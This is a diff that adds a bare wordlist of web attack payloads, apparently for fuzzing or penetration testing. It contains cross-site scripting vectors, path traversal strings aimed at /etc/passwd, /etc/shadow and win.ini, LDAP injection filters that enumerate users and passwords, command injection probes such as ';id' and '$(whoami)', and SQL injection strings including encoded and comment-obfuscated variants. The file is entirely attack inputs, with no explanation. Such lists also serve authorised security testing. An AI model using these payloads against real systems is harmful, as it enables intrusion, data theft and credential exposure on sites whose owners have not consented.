@@ -1,0 +1,103 @@
+'
+"
+`
+<
+>
+<>
+<script>alert(1)</script>
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+'><svg/onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<body onload=alert(1)>
+<svg onload=alert(1)>
+<a href=javascript:alert(1)>
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+%253Cscript%253Ealert(1)%253C/script%253E
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<img/src/onerror=alert(1)>
+<svg><script>alert(1)</script></svg>
+<math><mtext></mtext><script>alert(1)</script></math>
+../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../etc/passwd
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+/etc/issue
+/windows/win.ini
+/windows/system.ini
+C:\windows\win.ini
+C:\windows\system.ini
+..\
+..\..\
+..\..\..\
+%2e%2e%2f
+%2e%2e%5c
+*
+*)(
+)(|(
+*(|(objectclass=*))
+*(|(mail=*))
+admin*
+)(uid=*)
+|
+&
+(!(&(uid=*)(userPassword=*)))
+;id
+|id
+&&id
+||id
+;whoami
+|whoami
+&&whoami
+||whoami
+;uname -a
+|uname -a
+&&uname -a
+||uname -a
+`id`
+$(id)
+`whoami`
+$(whoami)
+%3Bid
+%7Cid
+%26%26id
+%7C%7Cid
+(|(objectClass=*))
+(&(objectClass=person))
+(uid=*)
+(|(uid=*))
+(&(uid=*)(userPassword=*))
+(|(cn=*))
+(cn=*)
+(|(mail=*))
+(mail=*)
+)(|(uid=*))
+*)(&(uid=*))
+*)(|(uid=*))
+(|(sn=*))
+(sn=*)
+(|(givenName=*))
+(givenName=*)
+(&(cn=*)(uid=*))
+(|(ou=*))
+(ou=*)
+' OR '1'='1'--
+1 OR 1=1
+' UNION SELECT NULL--
+' AND 1=2--
+' AND @@version IS NOT NULL--
+%27%20OR%20%271%27%3D%271%27--
+1/**/OR/**/1=1
+'/**/UNION/**/SELECT/**/NULL--
+'%20AND%201%3D2--
+%27%20AND%20@@version%20IS%20NOT%20NULL--
